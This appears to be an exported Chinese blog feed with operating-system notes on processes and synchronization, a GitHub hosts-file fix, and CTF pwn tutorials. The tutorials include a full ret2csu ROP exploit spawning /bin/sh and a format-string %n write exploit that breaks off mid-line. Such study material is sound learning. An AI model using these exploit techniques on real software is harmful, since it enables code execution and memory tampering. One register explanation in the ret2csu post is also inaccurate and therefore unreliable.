title="进程控制"></a>进程控制</h3><p>进程控制是指操作系统对进程进行创建、终止、暂停、恢复和调度等操作的管理和控制。通过进程控制，操作系统可以有效地管理进程的执行，分配资源并确保系统的正常运行。</p><p><em>进程创建</em></p><p>操作系统允许用户或其他进程创建新的进程。进程创建的过程中，操作系统会为新进程分配资源，包括内存空间、文件描述符、进程控制块等。操作系统还会为新进程设置初始状态和上下文，并将其加入进程调度队列中等待执行。</p><p><em>进程终止</em></p><p>进程可以正常终止，也可以由于错误、异常或用户请求而被强制终止。当一个进程终止时，操作系统会回收其占用的资源，释放内存空间，并更新相应的数据结构。此外，操作系统还会通知相关进程或用户进程的终止事件。</p><p><em>进程暂停和恢复</em></p><p>操作系统可以暂停一个正在运行的进程，使其暂时停止执行。进程暂停的原因可以是等待某个事件的发生，如等待 I&#x2F;O 操作完成。一旦等待的事件发生，操作系统会恢复进程的执行，使其继续运行。</p><p><em>进程调度</em></p><p>操作系统通过<u>进程调度算法</u>决定哪些进程获得 CPU 时间片并在运行态执行。调度算法可以根据进程的优先级、时间片轮转等策略来决定进程的执行顺序。进程调度的目标是实现公平性、高性能和响应时间的平衡。</p><h3 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h3><p>进程间通信（Inter-Process Communication，IPC）是指在操作系统中，不同进程之间进行数据交换、信息传递和协作的机制。进程间通信允许进程之间<u>共享数据、同步操作和相互通知</u>，以实现任务的协同完成。<br>实现方式（常见）：<br>1.<strong>管道（Pipe）</strong>：管道是一种半双工<sup>[1]</sup>的通信机制，用于在具有亲缘关系的两个进程之间进行通信。管道有两种类型：无名管道（Anonymous Pipe）和命名管道（Named Pipe）。无名管道用于父子进程之间的通信，而命名管道允许无关进程之间的通信。<br>2.<strong>共享内存（Shared Memory）</strong>：共享内存是一种高效的进程间通信方式，它允许多个进程访问<u>同一块内存区域</u>。进程可以将共享内存映射到它们的地址空间中，从而可以直接读写共享数据，而无需进行数据复制。共享内存需要使用同步机制（如信号量）来协调进程对共享数据的访问。<br>3.<strong>信号量（Semaphore）</strong>：信号量是一种用于进程间同步的机制。它可以用来实现进程的互斥访问共享资源和进程的同步操作。信号量维护一个计数器，进程可以对信号量进行等待（阻塞）和释放（唤醒）操作，以控制对共享资源的访问。（<em>具体后面进程互斥会提到，先留个印象</em>）<br>4.<strong>消息队列（Message Queue）</strong>：消息队列<sup>[2]</sup>是一种基于消息的进程间通信方式。进程可以将消息发送到队列中，并由其他进程从队列中接收消息。消息队列可以实现进程之间的异步通信，进程可以按照自己的节奏发送和接收消息，而不需要进行直接的同步等待。<br>5.<strong>套接字（Socket）</strong>：套接字是一种用于网络通信的通用接口，它也可以用于进程间通信。进程可以通过套接字进行网络通信，也可以在同一台计算机上的不同进程之间进行进程间通信。套接字提供了一种可靠的、面向连接的通信方式。</p><p>[1] <em>半双工（Half-Duplex）通信机制是指通信双方可以交替地发送和接收数据，但不能同时进行发送和接收。比喻起来，可以将半双工通信类比为对话中的单向讲话。当一个人在说话时，另一个人必须静默等待，然后才能回应。在这种情况下，每个人都可以发送和接收信息，但不能同时进行。相比于半双工，全双工通信则允许通信双方同时发送和接收数据。</em><br>[2] <em>消息队列通常由消息生产者、消息队列和消息消费者组成。简单的来说，消息生产者给出消息，消息队列存放消息，消息消费者根据需求接受消息。对应上文，进程既可以当消息生产者，也可以当消息消费者</em></p><h3 id="进程互斥"><a href="#进程互斥" class="headerlink" title="进程互斥"></a>进程互斥</h3><p>进程互斥是指多个进程在访问共享资源时的一种机制，旨在<u>防止多个进程同时访问或修改同一个共享资源，从而避免数据不一致或竞争条件的发生</u>。在并发执行的环境中，多个进程可能会同时访问共享资源，比如共享内存区域、文件、设备等。如果没有适当的互斥机制，就有可能导致数据损坏、竞争条件和不确定性的问题。<br>实现（常见）：<br>1.<strong>互斥锁（Mutex）</strong>：互斥锁是最常用的进程互斥机制之一。它是一种二进制标志，且只有一个进程可以持有互斥锁，每个共享资源都有一个关联的互斥锁。在访问共享资源之前，进程需要先尝试获取互斥锁。如果互斥锁已经被其他进程持有，则当前进程会被阻塞，直到互斥锁被释放。一次只有一个进程能够持有互斥锁，确保了对共享资源的互斥访问。<br>2.<strong>条件变量（Condition Variable）</strong>：条件变量用于进程之间的通信和同步，它允许一个进程等待某个条件满足后再继续执行。条件变量通常与互斥锁一起使用<sup>[3]</sup>，确保在等待条件时不会发生竞争条件。<br>3.<strong>信号量（Semaphore）</strong>：信号量是一种计数器，用于控制同时访问共享资源的进程数量。它可以用来实现互斥和同步。当进程需要访问共享资源时，在访问之前会尝试对信号量进行减操作，如果减操作的结果小于零，则当前进程会被阻塞，直到其他进程释放了信号量。（举个栗子：假设刚开始信号量的值为3，说明此时该共享资源允许有三个进程同时访问它，每多一个进程正在访问它，信号量的值就减一，直到其值为0，此时已经满了，若再来一个进程，进行减操作后发现结果小于0，那么该进程就会被阻塞，不让它访问）<br>4.<strong>读写锁（ReadWrite Lock）</strong>：读写锁允许多个进程同时读取共享资源，但只允许一个进程进行写操作。这种机制适用于读取频繁、写入较少的场景，可以提高并发性能。<br>[3] <em>条件变量的使用通常遵循以下模式：(1)进程获取互斥锁。(2)进程检查某个条件是否满足，如果不满足，则调用等待操作，释放互斥锁，并进入阻塞状态。(3)其他进程在一定条件下修改共享资源，并通过通知操作唤醒等待的线程。(4)被唤醒的进程重新获取互斥锁，继续执行。</em></p><h3 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h3><p>进程同步是指多个进程之间协调和控制彼此的执行顺序，以确保它们按照预期的方式进行交互和共享资源。进程同步的目的是避免竞争条件、数据不一致和其他并发问题。在并发环境中，多个进程同时执行，彼此之间的执行顺序是不确定的。这可能会导致一些问题，比如竞态条件（Race condition）<sup>[4]</sup>、死锁（Deadlock）<sup>[5]</sup>和活锁（Livelock）<sup>[6]</sup>等。为了解决这些问题，需要使用适当的进程同步机制。<br>实现（常见）：<br>1.<strong>信号量（Semaphore）</strong><br>2.<strong>互斥锁（Mutex）</strong><br>3.<strong>条件变量（Condition Variable）</strong><br>4.<strong>读写锁（ReadWrite Lock）</strong><br>5.<strong>屏障（Barrier）</strong>：屏障用于确保多个进程在并发执行过程中达到某个同步点之前都会等待。当所有进程都到达屏障点后，它们才能继续执行。</p><hr><p><em>可以说进程互斥是进程同步的一种特殊情况。进程同步更广泛地涵盖了进程之间协调和控制的方方面面，包括确保进程按照预期的顺序执行、等待其他进程完成某个操作、通知其他进程等。而进程互斥仅关注在多个进程访问共享资源时的互斥访问问题。</em></p><hr><p>[4] <em>竞态条件（Race Condition）是指在多线程或多进程环境中，由于多个线程或进程之间的执行顺序不确定而导致的问题。这种不确定性可能会导致共享资源的访问和修改顺序与预期不符，从而导致程序产生不正确的结果。</em><br><em>举个栗子</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BankAccount</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.balance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deposit</span>(<span class="params">self, amount</span>):</span><br><span class="line">        current_balance = <span class="variable language_">self</span>.balance</span><br><span class="line">        current_balance += amount</span><br><span class="line">        <span class="variable language_">self</span>.balance = current_balance</span><br></pre></td></tr></table></figure><p>假设有两个线程同时执行以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">account = BankAccount()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程1的操作</span></span><br><span class="line">thread1:</span><br><span class="line">    account.deposit(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程2的操作</span></span><br><span class="line">thread2:</span><br><span class="line">    account.deposit(<span class="number">200</span>)</span><br></pre></td></tr></table></figure><p><em>在单线程情况下，期望的结果是账户余额增加到300。但是，由于线程1和线程2是并行执行的，存在竞态条件，可能导致以下情况发生：</em><br><em>线程1读取账户余额为0。</em><br><em>线程2读取账户余额为0。</em><br><em>线程1计算新余额为100。</em><br><em>线程2计算新余额为200。</em><br><em>线程1更新账户余额为100。</em><br><em>线程2更新账户余额为200。</em><br><em>在这种情况下，账户余额只增加到了200，而不是期望的300。这是因为两个线程同时读取了账户余额，进行了计算和更新操作，导致竞态条件产生。</em></p><p>[5] <em>死锁（Deadlock）是指在并发系统中，两个或多个进程或线程因互相等待对方释放资源而造成的一种僵持状态，导致它们无法继续执行下去。死锁形成需满足四个条件：</em><br><em>1.互斥条件（Mutual Exclusion）：至少有一个资源被标记为独占性资源，同一时间只能被一个进程或线程占用。</em><br><em>2.占有和等待条件（Hold and Wait）：进程或线程至少已经持有一个资源，同时还在等待获取其他进程或线程占用的资源。</em><br><em>3.不可剥夺条件（No Preemption）：已经占有的资源不能被其他进程或线程强制性地剥夺，只能在自愿释放后才能让其他进程使用。</em><br><em>4.循环等待条件（Circular Wait）：存在一个进程或线程的资源请求链，形成一个循环等待的环路。</em><br><em>条件2、3和4简单理解就是：现有进程abc，分别占有资源123，且a还需2才能执行，b还需3才能执行，c还需1才能执行，他们都在等待对方让出资源，然后就会陷入死循环，无限等待</em><br><em>预防死锁只需破坏四个条件其中之一即可</em></p><p>[6] <em>活锁（Livelock）是一种类似于死锁的情况，其中多个进程或线程在<u>相互响应对方的动作</u>时陷入无限循环，导致它们无法继续向前推进或完成任务。在活锁中，进程或线程一直在不停地改变自己的状态以避免冲突，但是它们无法取得进展。这种情况下，虽然进程或线程没有被阻塞，但它们却无法完成所需的工作。</em><br><em>简单来说，发生死锁时进程等的是对方的资源，发生活锁时进程等的是对方的动作或响应，也是一个互相等待的过程</em></p><h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><p>&emsp;&emsp;临界区（Critical Section）是指在多线程或多进程环境中，访问共享资源或共享数据的那部分<u>代码区域</u>。在临界区内，只允许一个线程或进程访问共享资源，其他线程或进程必须等待。<br>&emsp;&emsp;临界区的目的是确保在并发访问共享资源时的数据一致性和正确性。当多个线程或进程需要同时访问共享资源时，如果不进行同步控制，就可能会导致数据竞争和错误的结果。通过将访问共享资源的代码包裹在临界区中，可以保证同一时间只有一个线程或进程可以执行临界区内的代码，从而避免竞争条件的发生。<br>使用临界区时，需要注意以下几点：<br>·互斥访问：临界区内的代码需要通过互斥机制（如互斥锁、信号量等）来确保在任意时刻只有一个线程或进程可以执行临界区内的代码。<br>·尽量减少临界区的长度：临界区的长度越长，其他线程或进程就需要等待更长的时间才能访问共享资源，可能导致性能下降。因此，应尽量将临界区的长度缩短，只包含必要的代码。<br>·避免死锁：如果多个线程或进程相互等待对方释放资源，可能导致死锁。因此，在设计临界区时，需要合理设置同步机制，避免死锁情况的发生。<br>·公平性：在多线程环境中，应该考虑公平性，即每个线程都有机会访问临界区，避免某个线程长时间占据临界区而导致其他线程无法访问。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo推送文章失败解决方案</title>
      <link href="/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><em>网上的一些常规解决方法可以先试试</em><br><em>这边记录一下试验成功的一个方法</em></p><p>往本地的host文件中添加GitHub的ip<br>格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">140.82.114.4 github.com</span><br></pre></td></tr></table></figure><p><em>关于如何查GitHub的ip</em></p><p>可以使用在线的DNS解析工具<br>MXtoolbox (<a href="https://mxtoolbox.com/DNSLookup.aspx">https://mxtoolbox.com/DNSLookup.aspx</a>): MXtoolbox提供了各种网络工具，包括DNS解析工具。在其DNS Lookup页面上，你可以输入域名并选择查询类型（如A记录、CNAME记录、MX记录等），然后点击”DNS Lookup”按钮来执行DNS查询并获取IP地址。</p><p>DNS Checker (<a href="https://dnschecker.org/">https://dnschecker.org/</a>): DNS Checker是一个简单易用的在线DNS解析工具。你只需输入域名，选择查询类型，并点击”Go”按钮来进行DNS查询。它将显示相关的DNS记录，包括IP地址、TTL（Time To Live）值等。</p><p>DNS Lookup (<a href="https://dns-lookup.com/">https://dns-lookup.com/</a>): DNS Lookup提供了一个简单的界面来执行DNS查询。你可以输入域名并选择查询类型，然后点击”Lookup”按钮来获取IP地址和其他相关信息。</p><p>Network Tools by Google Cloud (<a href="https://toolbox.googleapps.com/apps/dig/">https://toolbox.googleapps.com/apps/dig/</a>): Google Cloud的Network Tools提供了各种网络工具，其中包括DIG工具用于执行DNS查询。你可以在该页面上输入域名并选择查询类型，然后点击”Run Query”来获取DNS记录和IP地址。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2024/04/01/ret2csu/"/>
      <url>/2024/04/01/ret2csu/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>漏洞来源于_libc_csu_init 这个文件，它原本是用于对程序进行初始化，但是它的一些代码片段可以被我们利用<br>如图<br><img src="https://gateway.pinata.cloud/ipfs/bafkreifmbh4bsjeeeghax7oawvmrsnmfurvooxjy47xxj4szjkrcnz5dca" alt="1"></p><p>下面我们将0x4007d0 - 0x4007e4的片段称为gadget2，0x4007e6 - 0x4007f4的片段称为gadget1<br>利用gadget1，我们可以实现：对rbx,rbp,r12,r13,r14,r15传参<br>利用gadget2，我们可以实现：将r13的值赋给rdx，将r14的值赋给rsi，将r15d的值赋给edi<br>即我们可以对rbx，rbp，r12，rdx，rsi，edi传参</p><p>注意这段汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp     rbx, rbp</span><br><span class="line">jnz     short loc_4007D0</span><br></pre></td></tr></table></figure><p>它的作用是比较rbx和rbp的值，如果二者<strong>不相等</strong>，就跳转到loc_4007D0这个位置，我们一般不希望它跳转，所以我们一般令rbp&#x3D;1，rbx&#x3D;0（因为上一句汇编是add  rbx, 1  ，即使rbx的值加1）</p><hr><p><em>补充：r15d和rdi都是r15的低32位部分，区别在于，r15d用于32位模式（指处理器模式而不是操作系统架构！！），rdi用于64位模式，并且RDI可以访问更大的内存空间</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br></pre></td></tr></table></figure><p>ds: 是段寄存器前缀，用于指定数据段寄存器。它表示要访问的数据存储在数据段中。这句汇编代码的意思是call __frame_dummy_init_array_entry - 600E10h这个地址的函数，该地址通过r12+rbx*8计算得出，并且数据存储在数据段中。</p><hr><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>VNCTF2022公开赛clear_got</strong></p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreiatod7ncwgjyitt7kf6nu7o6n3pn2otjsexprqq6fh5povw66wmam" alt="1"></p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreif75gwqjuixh3lufrayfpdeyg3q36pxlpj6egtowwtswp7md7hdxe" alt="2"></p><p>可以看到存在栈溢出，无binsh字段，无system函数,开启了nx保护<br>注意这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;qword_601008, <span class="number">0</span>, <span class="number">0x38</span>uLL);</span><br></pre></td></tr></table></figure><p>它将&amp;qword_601008往上0x38大小的数据覆写为0，即下面这段数据<br><img src="https://gateway.pinata.cloud/ipfs/bafkreicguin2eakqnkpb4qo5g4evtnd5tjuyyikef6ojo6qvnndqn53ouq" alt="1"><br>发现这段数据是got表的内容，即函数执行到这里，got表的内容就被清空了<br>于是我们考虑利用系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><p>64位下，其调用号为0x3b<br>回顾一下：x86_64：syscall调用号存放于rax  syscall参数（传参顺序）：rdi rsi rdx r10 r8 r9</p><p>首先我们要能控制rax，其次往.bss段写入’&#x2F;bin&#x2F;sh’，最后分别控制rdi和rsi</p><h3 id="如何控制rax？"><a href="#如何控制rax？" class="headerlink" title="如何控制rax？"></a>如何控制rax？</h3><p><em>就本题而言，没有出现’pop rax ret’字段，所以我们要另辟蹊径</em></p><blockquote></blockquote><pre><code>*调用 read 函数*mov rax, 0      ; 系统调用号为 0 表示 readmov rdi, fd     ; 文件描述符mov rsi, buf    ; 缓冲区地址mov rdx, buf_len ; 读取的最大字节数syscall*检查返回值*cmp rax, 0      ; 如果 rax 大于 0，则表示成功读取了字节数jl error        ; 如果 rax 小于 0，则表示发生了错误; 在这里可以处理读取的数据*正常退出*mov eax, 60     ; 系统调用号为 60 表示 exitxor edi, edi    ; 退出码为 0syscall</code></pre><blockquote></blockquote><p><em>write同理</em><br>可以看出在x86_64架构下，<strong>read和write函数的返回值会存放在rax寄存器</strong>，所以我们可以利用这两个函数来控制rax</p><hr><p>康康gadget<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiclisxzqp2qbggusfz3ibx3g6iurgxjgcvjlcmucbcsck32uzzb7u" alt="0"><br>一堆r12 13啥啥的，所以我们得利用_libc_csu_init 来构造rop链</p><p>在x86_64架构下，main函数的返回值通常存放在寄存器 rax 中,而main函数正常执行最后有return 0，故rax里面已经存放着0，并且read函数的系统调用号刚好是0，所以我们可以直接syscall read</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./clear_got&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x7fffffffdea0</span>-<span class="number">0x7fffffffde40</span></span><br><span class="line">syscall_addr=<span class="number">0x040077E</span></span><br><span class="line">gadget1=<span class="number">0x04007Ea</span> <span class="comment">## 不能是0x4007e6 即不包括&#x27;add rsp, 8&#x27;这句汇编</span></span><br><span class="line">gadget2=<span class="number">0x04007D0</span></span><br><span class="line">tem_proc=<span class="number">0x600e48</span> <span class="comment">#用ida看到的tem_proc地址是0x0400804，我们利用gdb的search -p 0x0400804 就可以查出指向该地址的地址（为啥要该地址的地址下面会讲）</span></span><br><span class="line">bss_addr=<span class="number">0x0601060</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(offset+<span class="number">8</span>) <span class="comment">##栈溢出</span></span><br><span class="line">payload+=p64(gadget1) <span class="comment">#ret</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">payload+=p64(tem_proc+<span class="number">0x8</span>) <span class="comment">#r12 使得gadget2中的call指令call的是temproc这个空函数，避免造成影响，0x8 对应 rbx*8   想要用call去跳转到一个地址A，那就必须用一个指向地址A的地址B放到call后面</span></span><br><span class="line">payload+=p64(<span class="number">59</span>) <span class="comment"># r13——&gt;rdx 59为execve 在64位架构下的系统调用号   *读取的最大字节数 ；读取成功后，read函数将返回一个 ssize_t 类型的值，表示实际读取的字节数，即我们这里填入的59</span></span><br><span class="line">payload+=p64(bss_addr) <span class="comment">#r14——&gt;rsi 传参,我们要利用read往bss段写入&#x27;binsh&#x27;   *缓冲区地址</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r15(r15d)——&gt;edi  *文件描述符</span></span><br><span class="line">payload+=p64(gadget2) <span class="comment">#ret  </span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>) <span class="comment">#r12  利用call函数来执行填入到.bss段里的syscall</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r13——&gt;rdx</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r14——&gt;rsi</span></span><br><span class="line">payload+=p64(bss_addr) <span class="comment">#r15(r15d)——&gt;edi</span></span><br><span class="line">payload+=p64(syscall_addr) <span class="comment">#ret,之后程序会进行系统调用read函数 之后rax的值就变成59</span></span><br><span class="line">payload+=p64(gadget2) <span class="comment">#syscall后的ret</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)+<span class="string">b&#x27;\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#往.bss段写入&#x27;/bin/sh&#x27;，这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>漏洞来自c语言的printf函数，因为printf函数不会检查参数的个数与格式化字符串的个数是否对应，也就是说，只要有格式化参数在，即使我们没有往printf函数传去参数，它也会默认在栈上向后（向高地址）寻找对应参数并根据格式化字符串来解析，举个栗子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prinf(<span class="string">&quot;%s%s%s&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们虽然没有给printf传参，但它依旧会把后面地址（高地址）上的内容作为参数来使用，栈的情况如下图</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreicjvfhpvfgoxudw334wn632junbgjo7ro2e33n74chpy22k2f7gxe" alt="stack"></p><p>可以看到，格式化字符串的内容也是放在了栈上，因为我们没有传参，所以printf会把0xffffada8、0xffffada9、0xffffadaa作为参数，根据%s，将其解析并以字符串形式输出<br>有如下语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure><p>如果我们能控制buf的内容，就可以利用格式字符串漏洞</p><h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><p>就像上面举的例子，我们只要多写几个%s，就可将栈上的内，容解析并以字符串形式输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然，并非所有栈上的的地址都可以被解析，所以上述方法可能会（且大概率会）造成程序崩溃<del>当然这也是一种攻击手段，只不过作用是让服务器瘫痪</del></p><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>如果此时栈上存放着got表的某个表项的内容，我们可以利用%s来读取它，并进一步获取libc版本，如果栈上未存放，我们可以将需要的got表表项地址填入栈上（情况与允许的话），然后再读取内容。</p><h3 id="修改栈内存"><a href="#修改栈内存" class="headerlink" title="修改栈内存"></a>修改栈内存</h3><p>此时我们需要用到 <strong>%n</strong> 这个格式字符串，其作用是将已经打印出的字节数存放到相应的整形变量上<br>例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ssss%n&quot;</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%d&quot;</span>,a);<span class="comment">//输出a=4</span></span><br></pre></td></tr></table></figure><p>我们将a换成所需修改的（栈上的）变量的地址，就可以修改栈内存</p><h3 id="修改任意地址内存"><a href="#修改任意地址内存" class="headerlink" title="修改任意地址内存"></a>修改任意地址内存</h3><p>原理与修改栈内存一样，换个目标地址就行</p><hr><p><em>覆写小数字：</em><br>如果要覆写的数字较小，比如为2（小于四字节），这样即使在32位的情况下，目标地址也占用了4个字节那么%n输出的数据就不会小于4<br>解决办法：先填入所需覆写的数据大小对应的字符串（如果要覆写成2，就填’aa’），再填入目标地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=flat([<span class="string">b&#x27;aa&#x27;</span>,<span class="string">b&#x27;%k$naa&#x27;</span>,addr]) <span class="comment">## k记得根据实际情况改变 n后面的&#x27;aa&#x27;是为了补全四个字节</span></span><br></pre></td></tr></table></figure><p>此时栈中情况如图</p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-23%20223031.png" alt="a"></p><hr><p><em>覆写大数字</em><br>如果要覆写的数字比较大，一般情况下我们无法一次性填入几十甚至几百的字符，此时我们可以利用格式化字符的宽度设置来覆写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=flat([<span class="string">b&#x27;%20c&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>,addr]) <span class="comment"># 此时会在字符&#x27;a&#x27;前面补19个空格,使得其宽度为20</span></span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>攻防世界的CGfsb</strong></p><p>用ida查看<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibuzmx64bxsmtrarmdv6r562nmb6wj4qn42xpdnie7yzkocshrmfu" alt="ida"></p><p>没有栈溢出，发现存在格式化字符串漏洞，我们的目标是使得pwnme&#x3D;8，然后即可获得flag<br>思路：可以往s写入pwnme的地址，然后再利用%n往pwnme写入8</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr=<span class="number">0x0804A068</span></span><br><span class="line">payload=flat([pwnme_addr,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;%10$n&#x27;</span>]) <span class="comment">## 